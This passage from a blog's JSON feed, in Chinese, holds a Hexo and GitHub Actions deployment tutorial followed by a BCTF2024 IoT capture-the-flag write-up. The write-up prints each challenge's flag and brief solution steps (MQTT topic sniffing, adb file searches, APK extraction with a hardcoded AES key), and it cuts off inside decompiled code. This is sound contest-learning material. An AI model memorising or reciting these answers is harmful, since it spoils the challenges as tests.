            "content_html": "<h1 id=\"hexo-使用github-action-发布\"><a class=\"anchor\" href=\"#hexo-使用github-action-发布\">#</a> Hexo 使用 github Action 发布</h1>\n<h2 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h2>\n<p>Github Actions 可以很方便实现 CI/CD 工作流，类似 Travis 的用法，来帮我们完成一些工作，比如实现自动化测试、打包、部署等操作。当我们运行 Jobs 时，它会创建一个容器 (runner)，容器支持：Ubuntu、Windows 和 MacOS 等系统，在容器中我们可以安装软件，利用安装的软件帮我们处理一些数据，然后把处理好的数据推送到某个地方。</p>\n<p>本文将介绍利用 Github Actions 实现自动部署 hexo 到 Github Pages 和阿里云 oss</p>\n<p>没有 Github Actions 之前，我们需要写完文章执行  <code>hexo d</code>  来进行部署。有了 Github Actions  之后，workflow 会自动部署我们的笔记。</p>\n<h2 id=\"前提\"><a class=\"anchor\" href=\"#前提\">#</a> 前提</h2>\n<h3 id=\"创建所需仓库\"><a class=\"anchor\" href=\"#创建所需仓库\">#</a> 创建所需仓库</h3>\n<ol>\n<li>创建一个 github 仓库用来存放 Hexo 项目，我这边是  <code>Twelveeee/MyNotesBlog</code>  一个 private 的仓库</li>\n<li>创建  <code>your.github.io</code>  仓库用来存放静态博客 github page，我这边是  <code>Twelveeee/Twelveeee.github.io</code></li>\n</ol>\n<h3 id=\"配置-githubtoken\"><a class=\"anchor\" href=\"#配置-githubtoken\">#</a> 配置 GithubToken</h3>\n<p>GithubToken 是为了在执行 githubAction 的时候有权限访问仓库</p>\n<p>参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE1MDY5NDg1LzM1OTAzNDY=\">https://blog.51cto.com/u_15069485/3590346</span></p>\n<p>在 github setting 打开 Developer settings</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233238214.png\" alt=\"image-20241001233238214\" /></p>\n<p>打开 Personal access tokens</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233409638.png\" alt=\"image-20241001233409638\" /></p>\n<p>点击 Generate new token 按钮</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233508640.png\" alt=\"image-20241001233508640\" /></p>\n<p>选择对应的仓库</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241001233811094.png\" alt=\"image-20241001233811094\" /></p>\n<p><strong>Permissions</strong> 开</p>\n<p><code>Read access to actions variables and secrets</code></p>\n<p><code>Read and Write access to actions, code, commit statuses, deployments, environments, pages, pull requests, and workflows</code></p>\n<p>获取到 token 记录下来</p>\n<h3 id=\"配置-githubaction-参数\"><a class=\"anchor\" href=\"#配置-githubaction-参数\">#</a> 配置 GithubAction 参数</h3>\n<p>打开项目，  <code>Settinngs-&gt;Secrets and variables New repository secret</code></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241002000219935.png\" alt=\"image-20241002000219935\" /></p>\n<p>把上面提到的 token 写进去 变量名称需要与下面的 deploy.yml 一致</p>\n<h2 id=\"编写-github-actions\"><a class=\"anchor\" href=\"#编写-github-actions\">#</a> 编写 Github Actions</h2>\n<h3 id=\"workflow-模版\"><a class=\"anchor\" href=\"#workflow-模版\">#</a> Workflow 模版</h3>\n<p>在  <code>blog</code>  仓库根目录下创建  <code>.github/workflows/deploy.yml</code>  文件，目录结构如下。</p>\n<pre><code>blog (repository)\n└── .github\n    └── workflows\n        └── deploy.yml\n</code></pre>\n<p>在  <code>deploy.yml</code>  文件中粘贴以下内容。并且更改 env 为自己对应的值。</p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Pages</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">on</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">push</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token key atrule\">branches</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token punctuation\">-</span> main</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token key atrule\">env</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token key atrule\">GIT_USER</span><span class=\"token punctuation\">:</span> Twelveeee</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token key atrule\">GIT_EMAIL</span><span class=\"token punctuation\">:</span> twelveeee12@gmail.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token key atrule\">THEME_REPO</span><span class=\"token punctuation\">:</span> Twelveeee/hexo<span class=\"token punctuation\">-</span>theme<span class=\"token punctuation\">-</span>shokaV2</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token key atrule\">THEME_BRANCH</span><span class=\"token punctuation\">:</span> master</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token key atrule\">THEME_NAME</span><span class=\"token punctuation\">:</span> shoka</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">DEPLOY_REPO</span><span class=\"token punctuation\">:</span> Twelveeee/Twelveeee.github.io</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token key atrule\">DEPLOY_BRANCH</span><span class=\"token punctuation\">:</span> main</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token key atrule\">jobs</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token key atrule\">build</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token key atrule\">runs-on</span><span class=\"token punctuation\">:</span> ubuntu<span class=\"token punctuation\">-</span>latest</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token key atrule\">steps</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>secrets.PAT_TOKEN<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>          <span class=\"token key atrule\">submodules</span><span class=\"token punctuation\">:</span> recursive</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Configuration environment</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>          sudo timedatectl set-timezone \"Asia/Shanghai\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          git config --global user.name $GIT_USER</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          git config --global user.email $GIT_EMAIL</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Checkout theme repo</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>          <span class=\"token key atrule\">repository</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_REPO <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token key atrule\">ref</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_BRANCH <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> themes/$<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.THEME_NAME <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Checkout deploy repo</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/checkout@v4</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>          <span class=\"token key atrule\">repository</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.DEPLOY_REPO <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>          <span class=\"token key atrule\">ref</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> env.DEPLOY_BRANCH <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> .deploy_git</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>          <span class=\"token key atrule\">token</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Use Node.js 20</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/setup<span class=\"token punctuation\">-</span>node@v4</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>          <span class=\"token key atrule\">node-version</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"20\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Cache NPM dependencies</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token key atrule\">uses</span><span class=\"token punctuation\">:</span> actions/cache@v4</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token key atrule\">with</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>          <span class=\"token key atrule\">path</span><span class=\"token punctuation\">:</span> node_modules</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>          <span class=\"token key atrule\">key</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> runner.OS <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">-</span>npm<span class=\"token punctuation\">-</span>cache</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>          <span class=\"token key atrule\">restore-keys</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            $&#123;&#123; runner.OS &#125;&#125;-npm-cache</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Install Dependencies</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> npm install</pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> Deploy hexo</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token key atrule\">env</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>          <span class=\"token key atrule\">GITHUB_TOKEN</span><span class=\"token punctuation\">:</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span> secrets.PAT_TOKEN <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token key atrule\">run</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">|</span><span class=\"token scalar string\"></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>          npm run deploy</span></pre></td></tr></table></figure><h3 id=\"模版说明\"><a class=\"anchor\" href=\"#模版说明\">#</a> 模版说明</h3>\n<h4 id=\"workflow-overview\"><a class=\"anchor\" href=\"#workflow-overview\">#</a> Workflow Overview</h4>\n<p>这个工作流名为  <code>Pages</code> ，在  <code>main</code>  分支有新的推送时会被触发。都会自动更新博客的内容。</p>\n<h4 id=\"environment-variables\"><a class=\"anchor\" href=\"#environment-variables\">#</a> Environment Variables</h4>\n<ul>\n<li><strong>GIT_USER</strong>: Git 用户名，用于配置 Git 提交。</li>\n<li><strong>GIT_EMAIL</strong>: Git 邮箱地址，用于配置 Git 提交。</li>\n<li><strong>THEME_REPO</strong>: Hexo 主题的仓库地址。</li>\n<li><strong>THEME_BRANCH</strong>: Hexo 主题的分支。</li>\n<li><strong>THEME_NAME</strong>: Hexo 主题的名称。</li>\n<li><strong>DEPLOY_REPO</strong>: 部署的 GitHub Pages 仓库。</li>\n<li><strong>DEPLOY_BRANCH</strong>: 部署的分支。</li>\n</ul>\n<h4 id=\"job-build\"><a class=\"anchor\" href=\"#job-build\">#</a> Job: build</h4>\n<p>这个工作流定义了一个名为  <code>build</code>  的作业，运行在最新的 Ubuntu 环境上。</p>\n<h5 id=\"steps\"><a class=\"anchor\" href=\"#steps\">#</a> Steps</h5>\n<ol>\n<li><strong>Checkout Main Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  来签出触发工作流的主仓库代码。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  作为身份验证令牌。</li>\n<li>递归地签出子模块。</li>\n</ul>\n</li>\n<li><strong>Configuration Environment</strong>:\n<ul>\n<li>设置时区为 &quot;Asia/Shanghai&quot;。</li>\n<li>配置 Git 用户名和邮箱，以便后续的提交操作。</li>\n</ul>\n</li>\n<li><strong>Checkout Theme Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  签出主题仓库。</li>\n<li>指定分支和路径为  <code>themes/$&#123;&#123; env.THEME_NAME &#125;&#125;</code> 。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  进行身份验证。</li>\n</ul>\n</li>\n<li><strong>Checkout Deploy Repository</strong>:\n<ul>\n<li>使用  <code>actions/checkout@v4</code>  签出用于部署的仓库。</li>\n<li>指定分支和路径为  <code>.deploy_git</code> 。</li>\n<li>使用  <code>$&#123;&#123; secrets.PAT_TOKEN &#125;&#125;</code>  进行身份验证。</li>\n</ul>\n</li>\n<li><strong>Use Node.js 20</strong>:\n<ul>\n<li>使用  <code>actions/setup-node@v4</code>  来设置 Node.js 环境，版本为 20。</li>\n</ul>\n</li>\n<li><strong>Cache NPM Dependencies</strong>:\n<ul>\n<li>使用  <code>actions/cache@v4</code>  缓存  <code>node_modules</code>  目录，以加速后续的构建。</li>\n<li>使用  <code>$&#123;&#123; runner.OS &#125;&#125;-npm-cache</code>  作为缓存键。</li>\n</ul>\n</li>\n<li><strong>Install Dependencies</strong>:\n<ul>\n<li>运行  <code>npm install</code>  安装项目所需的依赖。</li>\n</ul>\n</li>\n<li><strong>Deploy Hexo</strong>:\n<ul>\n<li>设置  <code>GITHUB_TOKEN</code>  环境变量，用于身份验证。</li>\n<li>运行  <code>npm run deploy</code> ，执行 Hexo 部署脚本，将生成的静态文件推送到 GitHub Pages 仓库。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"部署注意事项\"><a class=\"anchor\" href=\"#部署注意事项\">#</a> 部署注意事项</h3>\n<p>因为使用到了  <code>npm run deploy</code>  所以  <code>package.json</code>  里面要有 deploy</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">\"scripts\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"build\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo generate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"clean\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo clean\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token property\">\"deploy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo deploy\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token property\">\"server\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hexo server\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><p>使用  <code>hexo deploy</code></p>\n<p>所以需要确保安装了 hexo deploy 服务</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 发布到 oss</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">npm</span> i hexo-deployer-ali-oss-extend</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 发布到 github page </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span></pre></td></tr></table></figure><p>并且配置了相应的配置</p>\n<p><code>_config.yml</code>  里</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">deploy</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">-</span> <span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> ali<span class=\"token punctuation\">-</span>oss</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">region</span><span class=\"token punctuation\">:</span> oss<span class=\"token punctuation\">-</span>cn<span class=\"token punctuation\">-</span>beijing</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">accessKeyId</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token key atrule\">accessKeySecret</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token key atrule\">bucket</span><span class=\"token punctuation\">:</span> <span class=\"token important\">***</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token key atrule\">cacheControl</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token key atrule\">images</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token key atrule\">other</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">-</span> <span class=\"token key atrule\">type</span><span class=\"token punctuation\">:</span> git</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">repo</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//github.com/Twelveeee/Twelveeee.github.io</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token key atrule\">branch</span><span class=\"token punctuation\">:</span> main</pre></td></tr></table></figure><p>当然，如果没有对应的 type 可以将相应的配置注释掉。</p>\n<h3 id=\"执行任务\"><a class=\"anchor\" href=\"#执行任务\">#</a> 执行任务</h3>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20241002001734778.png\" alt=\"image-20241002001734778\" /></p>\n<p>任务完成之后查看 对应的 github page</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUuZ2l0aHViLmlvLw==\">https://twelveeee.github.io/</span></p>\n<p>确实有相应的文章</p>\n<h2 id=\"参考资料\"><a class=\"anchor\" href=\"#参考资料\">#</a> 参考资料</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2l0aHViLXBhZ2VzI09uZS1jb21tYW5kLWRlcGxveW1lbnQ=\">https://hexo.io/docs/github-pages#One-command-deployment</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW5vbnouZ2l0aHViLmlvLzIwMjAvZGVwbG95LWEtaGV4by1ibG9nLWZyb20tZ2l0aHViLWFjdGlvbnMv\">https://sanonz.github.io/2020/deploy-a-hexo-blog-from-github-actions/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FjdGlvbnMvY2hlY2tvdXQ=\">https://github.com/actions/checkout</span></p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "github"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/iot/",
            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/iot/",
            "title": "BCTF2024-IOT",
            "date_published": "2024-09-27T07:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-iot\"><a class=\"anchor\" href=\"#bctf2024-iot\">#</a> BCTF2024-IOT</h1>\n<h2 id=\"常见的iot通信协议\"><a class=\"anchor\" href=\"#常见的iot通信协议\">#</a> 常见的 IOT 通信协议</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>常见的 IOT 通信协议</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tOjgwMDE=\">example.com:8001</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{a2467320ce0f9bc6fda0a1f714e49933}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>brew install mosquitto</p>\n<p>mosquitto_sub -h <span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29t\">example.com</span>  -p 8001 -t &quot;#&quot;</p>\n</div></details>\n<h2 id=\"easyandroidemulator\"><a class=\"anchor\" href=\"#easyandroidemulator\">#</a> EasyAndroidEmulator</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<ol>\n<li>环境要求：x86_64，java17</li>\n<li>根据以下资源与提示运行一个 Android 模拟器:<br />\nAndroid Studio：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vc3R1ZGlv\">https://developer.android.com/studio</span><br />\nSDK Tools：Android SDK Command-line Tools、Android SDK-Platform-Tools、Android Emulator<br />\nSDK Updates Sites: 文件 bctf-sys-img2-1-0.xml<br />\nsdkmanager: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvc2RrbWFuYWdlcg==\">https://developer.android.com/tools/sdkmanager</span><br />\navdmanager: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvYXZkbWFuYWdlcg==\">https://developer.android.com/tools/avdmanager</span><br />\nemulator: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vc3R1ZGlvL3J1bi9lbXVsYXRvci1jb21tYW5kbGluZQ==\">https://developer.android.com/studio/run/emulator-commandline</span></li>\n<li>题目镜像：&quot;system-images;android-33;bctf-easy-android-emu;x86_64&quot;</li>\n<li>运行成功通过 adb 获取 flag</li>\n</ol>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{RN15l3IyVPzdBOaQC5XUkW4q8r26WA47}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>下载 android-studio<br />\n 安装 剩下的东西</p>\n<p>搭建环境，启动模拟器</p>\n<p>adb devices<br />\nadb shell</p>\n<p>find / -name &quot;flag*&quot; 2&gt;/dev/null</p>\n<p>找到路径<br />\n执行 /bin/flag</p>\n</div></details>\n<h2 id=\"encryption\"><a class=\"anchor\" href=\"#encryption\">#</a> encryption</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<ol>\n<li>环境：与 easy-android-emu 同样的基本环境。</li>\n<li>题目镜像：&quot;system-images;android-33;bctf-encryption;x86_64&quot;</li>\n</ol>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{tf4Lsa4KB99x1CmU1raGwuzcA7Pm1sCL}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>按照上一题的解法，打开模拟器后\n\nadb devices\nadb shell\n\n\n# 找到文件\nfind / -name &quot;*encryption*&quot; 2&gt;/dev/null\n\n\nadb pull /product/app/encryption/encryption.apk\nadb pull /product/app/encryption/oat/x86_64/encryption.odex\nadb pull /product/app/encryption/oat/x86_64/encryption.vdex\n\n\n# 下载apktool 进行解密\n# https://juejin.cn/post/7158107697907236878\n\n\n搜索 flag \n找到 encryption/smali/com/bctf/encryption/EncryptionService.smali\n\n\n加密串 z++f9Pms0o2J6j9wYyvHeGvi3lhbLqbOUVdXPmNeLFQIHSYoF+gnmRscOO8OzCUD\npkcs7\n密钥 bctfbctfbctfbctf\n\n</code></pre>\n</div></details>\n<h2 id=\"easyprivatenetworkprotocol\"><a class=\"anchor\" href=\"#easyprivatenetworkprotocol\">#</a> EasyPrivateNetworkProtocol</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>私有网络协议分析<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tOjg4ODg=\"> example.com:8888</span><br />\n <code>https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2024/iot_challenge</code></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p>差一点做出来</p>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{0Njb867t0ppd79Mel8XYP8Ms9UeptGNX}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>IDA 读 二进制文件</p>\n<p>发现几个函数</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 